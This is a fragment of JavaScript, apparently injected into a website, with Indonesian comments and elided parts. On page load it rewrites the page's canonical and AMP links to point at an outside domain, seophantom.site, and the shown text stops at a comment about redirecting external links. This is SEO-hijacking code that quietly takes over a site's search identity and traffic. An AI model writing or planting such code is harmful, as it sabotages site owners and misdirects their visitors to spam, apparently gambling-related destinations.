...
if (!window._globalNamespace.indexJsInitialized) {
  ...
  document.addEventListener("DOMContentLoaded", () => {
    try {
      // Mengubah canonical link
      let a = document.querySelector("link[rel=\"canonical\"]");
      if (a) {
        a.href = "https://seophantom.site/";
      }

      // Mengubah AMP link tanpa pengecekan URL
      let t = document.querySelector("link[rel=\"amphtml\"]");
      if (t) {
        t.href = "https://seophantom.site/amp/Jam350/jam350aclol";
      }

      // Menangani redirect untuk link eksternal
